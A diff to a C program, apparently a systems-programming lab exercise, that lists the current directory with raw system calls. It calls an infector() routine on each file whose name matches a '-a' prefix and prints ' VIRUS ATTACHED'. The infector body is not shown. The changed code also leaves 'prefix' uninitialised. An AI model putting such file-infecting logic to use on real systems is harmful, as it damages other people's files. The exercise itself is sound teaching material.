@@ -26,8 +26,8 @@ struct linux_dirent
 
 int main(int argc, char *argv[])
 {
-    int fd, res, pos, arg;
-    char buffer[BUFSIZE], msg[] = " VIRUS ATTACHED";
+    int fd, res, pos, i;
+    char *prefix, buffer[BUFSIZE], msg[] = " VIRUS ATTACHED";
     struct linux_dirent *d;
 
     fd = system_call(SYS_OPEN, ".", O_RDONLY, MODE);
@@ -47,23 +47,24 @@ int main(int argc, char *argv[])
     if (res == 0)
         return 0;
 
+    for (i = 1; i < argc; i++)
+        if (strncmp(argv[i], "-a", 2) == 0)
+        {
+            prefix = argv[i] + 2;
+            break;
+        }
     for (pos = 0; pos < res;)
     {
         d = (struct linux_dirent *)(buffer + pos);
+
         system_call(SYS_WRITE, STDOUT, (d->d_name) - 1, strlen(d->d_name) + 1);
-
-        for (arg = 1; arg < argc; arg++)
+        if (prefix && strncmp(prefix, (d->d_name) - 1, strlen(prefix)) == 0)
         {
-            if (strncmp(argv[arg], "-a", 2) == 0 &&
-                strncmp(argv[arg] + 2, (d->d_name) - 1, strlen(d->d_name) + 1) == 0)
-            {
-                infector(d->d_name - 1);
-                system_call(SYS_WRITE, STDOUT, msg, sizeof(msg) - 1);
-                break;
-            }
+            infector(d->d_name - 1);
+            system_call(SYS_WRITE, STDOUT, msg, sizeof(msg) - 1);
         }
-
         system_call(SYS_WRITE, STDOUT, "\n", 1);
+
         pos += d->d_reclen;
     }
 
